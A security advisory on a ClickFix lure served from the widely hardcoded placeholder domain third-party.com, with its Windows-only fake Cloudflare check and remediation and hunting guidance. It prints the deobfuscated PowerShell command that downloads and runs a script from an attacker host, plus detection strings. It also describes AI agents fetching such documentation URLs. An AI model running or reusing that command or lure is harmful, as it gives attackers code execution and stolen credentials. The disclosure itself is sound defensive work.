third-party.com, a domain first registered in 1996 and held under registrar Network Solutions, is serving a ClickFix lure that impersonates a Cloudflare "Performing security verification" page, and it does so only for Windows. A macOS or Linux user agent receives a near-identical decoy that stops at "macOS is not supported," so most scanners and reputation checkers see nothing. A Windows visitor who clicks the fake "Verify you are human" box gets a PowerShell one-liner written to the clipboard through a hidden textarea and a hijacked copy event, then is walked through Win+R, Ctrl+V, Enter. Manifold Security deobfuscated the planted command as powershell "Write-Host(&{iex(irm('elxxvvx[.]xyz/f'))})2>$null", padded with a fake six-digit verification ID so it resembles a captcha token; the technique maps to MITRE ATT&CK T1204 and T1059.001, and there is no CVE because no software flaw is involved. Manifold disclosed the campaign on September 23, 2026 and BleepingComputer confirmed the page the same day, finding the second stage elxxvvx[.]xyz already offline, though a VirusTotal artifact dated May 2, 2026 shows that domain previously served update2.zip, a 131MB archive.

The event feed frames this as one scammy domain, which undersells it. third-party.com is not IANA-reserved the way example.com, example.net, and example.org are, yet public code search shows it hardcoded in over 1,500 files across 1,700+ repositories, including Chromium's telemetry extension docs, a Playwright skill in Sanity's repo, a Turborepo unit test at Vercel, and W3C specifications. When control of the domain changed hands, every one of those pointers silently became a pointer at attacker infrastructure, the polyfill.io failure mode applied to a string nobody thought of as a dependency, with no code change or redeploy on anyone's side. The exposed population splits in two: developers who copy example code literally, a failure documented as far back as a 2015 Stack Overflow post, and AI agents that harvest example URLs from skills and MCP server documentation and fetch them at runtime. Success costs the attacker nothing and yields code execution with the victim's own privileges on a developer workstation holding source, tokens, and CI credentials; Microsoft Threat Intelligence's TerminalFix reporting of August 28, 2026 shows where such chains end, in DLL sideloading, Active Directory reconnaissance, and a reverse-tunnel implant. With ESET recording a 517% rise in fake-CAPTCHA campaigns between H2 2024 and H1 2025, this class is commoditized, and this instance matters because the abused trust anchor is documentation convention itself.

There is no patch to apply; remediation is hygiene and hunting. Sweep repositories, AI skills, MCP configs, and internal docs for third-party.com and the same class of unreserved placeholders such as yourcompany.com, mycompany.com, and your-api.com, and replace hits with the names IANA actually reserves. Block third-party.com and elxxvvx[.]xyz at DNS and proxy egress, and verify the block with a Windows user agent, because IPFire flagged the domain as malware on July 7, 2026 and delisted it on July 17 after non-Windows checks saw the clean decoy. Do not allowlist the domain to silence scanner noise. Hunt for the paste: PowerShell 4104 script-block events containing iex(irm( with a trailing 2>$null, powershell.exe spawned from the Win+R Run dialog, and the decoy string "Security check, I'm not a robot, Verification ID" in pasted commands. On the network side, alert on DNS queries for elxxvvx[.]xyz, fetches of update2.zip, and the staged script hash daf619aa8cc74dab02c360f46f9f4b7b1654ba478ee89992a3512a46f1f4c209.

Two developments would change this assessment. The lure domain was still live after its second stage died, so a single DNS change re-arms the full chain; the moment third-party.com resolves to a fresh payload host, this moves from broken chain to active campaign, and periodic re-checks with a Windows user agent are the only reliable tripwire. Manifold published a follow-up on September 24, 2026 documenting other placeholder domains serving scams, which would turn a one-domain incident into a sweep across every unreserved stand-in that documentation convention taught developers to trust, and the first confirmed infection through a copied documentation example would erase the current no-reported-victims caveat.
